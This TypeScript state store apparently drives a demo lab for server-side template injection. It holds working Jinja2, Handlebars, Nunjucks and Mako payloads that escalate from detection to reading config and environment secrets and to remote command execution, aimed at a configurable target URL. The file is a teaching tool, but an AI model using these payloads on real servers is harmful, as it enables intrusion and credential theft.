import { create } from 'zustand';
import type { Stage, StageId, StageStatus, EngineId, AttackMode, AttackResult } from '../types';
import { runAttack, runAttackChain } from '../api/client';

const DEFAULT_STAGES: Stage[] = [
  { id: 'DETECT', number: 1, name: 'Detect', status: 'READY' },
  { id: 'FINGERPRINT', number: 2, name: 'Fingerprint', status: 'LOCKED' },
  { id: 'EXTRACT', number: 3, name: 'Extract', status: 'LOCKED' },
  { id: 'ESCAPE', number: 4, name: 'Escape', status: 'LOCKED' },
  { id: 'RCE', number: 5, name: 'RCE', status: 'LOCKED' },
];

const STAGE_PAYLOADS: Record<StageId, Record<EngineId, string>> = {
  DETECT: {
    jinja2: '{{7*7}}',
    handlebars: '{{7*7}}',
    nunjucks: '{{7*7}}',
    mako: '${7*7}',
  },
  FINGERPRINT: {
    jinja2: '{{config.__class__.__init__.__globals__}}',
    handlebars: '{{#with "s" as |string|}}{{string.sub "constructor"}}{{/with}}',
    nunjucks: '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
    mako: '${self.__dict__}',
  },
  EXTRACT: {
    jinja2: '{{config.items()}}',
    handlebars: '{{lookup . "constructor"}}',
    nunjucks: '{{settings}}',
    mako: '${self.module.__dict__}',
  },
  ESCAPE: {
    jinja2: '{{"".__class__.__mro__[1].__subclasses__()}}',
    handlebars: '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{/with}}{{/with}}{{/with}}',
    nunjucks: '{{range.constructor("return process.env")()}}',
    mako: '<%\nimport os\n%>\n${os.listdir("/")}',
  },
  RCE: {
    jinja2: '{{"".__class__.__mro__[1].__subclasses__()[396]("id",shell=True,stdout=-1).communicate()[0].strip()}}',
    handlebars: '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\').toString()"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
    nunjucks: '{{range.constructor("return require(\'child_process\').execSync(\'id\').toString()")()}}',
    mako: '<%\nimport subprocess\n%>\n${subprocess.check_output(["id"])}',
  },
};

interface AttackState {
  engine: EngineId;
  targetUrl: string;
  mode: AttackMode;
  stages: Stage[];
  activeStage: StageId | null;
  chainRunning: boolean;
  lastResults: AttackResult[];
  currentPayload: string;
  currentResponse: string;
  currentEvidence: string;

  setEngine: (engine: EngineId) => void;
  setTargetUrl: (url: string) => void;
  setMode: (mode: AttackMode) => void;
  setActiveStage: (stage: StageId) => void;
  runStage: (stageId: StageId) => Promise<void>;
  runChain: () => Promise<void>;
  resetStages: () => void;
  updateStageStatus: (id: StageId, status: StageStatus, data?: Partial<Stage>) => void;
}

export const useAttackStore = create<AttackState>((set, get) => ({
  engine: 'jinja2',
  targetUrl: 'http://localhost:5000/render',
  mode: 'vulnerable',
  stages: DEFAULT_STAGES,
  activeStage: null,
  chainRunning: false,
  lastResults: [],
  currentPayload: '',
  currentResponse: '',
  currentEvidence: '',

  setEngine: (engine) => {
    set({ engine });
    // Update payload previews
    const stages = get().stages.map((s) => ({
      ...s,
      payload: STAGE_PAYLOADS[s.id][engine],
    }));
    set({ stages });
  },

  setTargetUrl: (targetUrl) => set({ targetUrl }),
  setMode: (mode) => set({ mode }),
  setActiveStage: (activeStage) => {
    const { stages, engine } = get();
    const stage = stages.find((s) => s.id === activeStage);
    if (stage) {
      set({
        activeStage,
        currentPayload: stage.payload || STAGE_PAYLOADS[activeStage][engine],
      });
    }
  },

  updateStageStatus: (id, status, data) => {
    set((s) => ({
      stages: s.stages.map((stage) =>
        stage.id === id ? { ...stage, status, ...data } : stage
      ),
    }));
  },

  runStage: async (stageId) => {
    const { engine, targetUrl, mode, stages } = get();
    const stage = stages.find((s) => s.id === stageId);
    if (!stage) return;

    const payload = stage.payload || STAGE_PAYLOADS[stageId][engine];

    set({ activeStage: stageId, currentPayload: payload });
    get().updateStageStatus(stageId, 'RUNNING', { payload });

    try {
      const result = await runAttack({ engine, target_url: targetUrl, stage: stageId, payload, mode });
      get().updateStageStatus(stageId, result.status, {
        result: result.response,
        response: result.response,
        evidence: result.evidence,
        duration_ms: result.duration_ms,
      });
      set({
        currentResponse: result.response,
        currentEvidence: result.evidence,
        lastResults: [...get().lastResults, result],
      });

      // Unlock next stage on success
      if (result.status === 'SUCCESS') {
        const currentIdx = stages.findIndex((s) => s.id === stageId);
        if (currentIdx < stages.length - 1) {
          const nextId = stages[currentIdx + 1].id;
          get().updateStageStatus(nextId, 'READY', {
            payload: STAGE_PAYLOADS[nextId][engine],
          });
        }
      }
    } catch (err) {
      // API offline — simulate result
      const simulated = simulateResult(stageId, engine, mode, payload);
      get().updateStageStatus(stageId, simulated.status, {
        result: simulated.response,
        response: simulated.response,
        evidence: simulated.evidence,
        duration_ms: simulated.duration_ms,
      });
      set({
        currentResponse: simulated.response,
        currentEvidence: simulated.evidence,
      });
      if (simulated.status === 'SUCCESS') {
        const currentIdx = stages.findIndex((s) => s.id === stageId);
        if (currentIdx < stages.length - 1) {
          const nextId = stages[currentIdx + 1].id;
          get().updateStageStatus(nextId, 'READY', {
            payload: STAGE_PAYLOADS[nextId][engine],
          });
        }
      }
    }
  },

  runChain: async () => {
    const { engine, targetUrl, mode } = get();
    set({ chainRunning: true });

    try {
      const results = await runAttackChain({ engine, target_url: targetUrl, mode });
      const updatedStages = DEFAULT_STAGES.map((s) => {
        const r = results.find((res) => res.stage === s.id);
        return r
          ? { ...s, status: r.status, payload: r.payload, response: r.response, evidence: r.evidence }
          : s;
      });
      set({ stages: updatedStages, lastResults: results });
      if (results.length > 0) {
        const last = results[results.length - 1];
        set({ currentPayload: last.payload, currentResponse: last.response, currentEvidence: last.evidence });
      }
    } catch {
      // Simulate chain
      for (const stage of DEFAULT_STAGES) {
        const payload = STAGE_PAYLOADS[stage.id][engine];
        await new Promise<void>((resolve) => setTimeout(resolve, 600));
        get().updateStageStatus(stage.id, 'RUNNING', { payload });
        await new Promise<void>((resolve) => setTimeout(resolve, 800));
        const sim = simulateResult(stage.id, engine, mode, payload);
        get().updateStageStatus(stage.id, sim.status, {
          response: sim.response,
          evidence: sim.evidence,
        });
        if (sim.status !== 'SUCCESS' && sim.status !== 'BLOCKED') break;
      }
    } finally {
      set({ chainRunning: false });
    }
  },

  resetStages: () =>
    set({
      stages: DEFAULT_STAGES,
      activeStage: null,
      lastResults: [],
      currentPayload: '',
      currentResponse: '',
      currentEvidence: '',
    }),
}));

// ─── Simulation (when API is offline) ────────────────────────────────────────

function simulateResult(
  stage: StageId,
  engine: EngineId,
  mode: AttackMode,
  payload: string
): AttackResult {
  const now = new Date().toISOString();
  const isHardened = mode === 'hardened';

  const responses: Record<StageId, { vuln: string; hard: string; evidence: string }> = {
    DETECT: {
      vuln: '49',
      hard: 'Template rendering error: unsafe expression',
      evidence: 'Math evaluated: 7*7=49 indicates template execution',
    },
    FINGERPRINT: {
      vuln: engine === 'jinja2' ? '<class jinja2.Environment>' : 'Handlebars v4.7.8',
      hard: 'SecurityError: restricted attribute access',
      evidence: 'Engine class leaked in response body',
    },
    EXTRACT: {
      vuln: 'SECRET_KEY=hunter2, DB_PASSWORD=p@ssw0rd',
      hard: 'Access to configuration denied',
      evidence: 'Sensitive configuration values extracted from template context',
    },
    ESCAPE: {
      vuln: '/root /home /etc /var /usr',
      hard: 'Sandbox violation: filesystem access blocked',
      evidence: 'Escaped sandbox — filesystem enumeration successful',
    },
    RCE: {
      vuln: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      hard: 'RCE attempt blocked by security policy',
      evidence: 'Arbitrary command execution achieved as www-data',
    },
  };

  const r = responses[stage];

  return {
    stage,
    status: isHardened ? 'BLOCKED' : 'SUCCESS',
    payload,
    response: isHardened ? r.hard : r.vuln,
    evidence: isHardened ? `Blocked: ${r.evidence}` : r.evidence,
    duration_ms: Math.floor(Math.random() * 200) + 80,
    timestamp: now,
  };
}
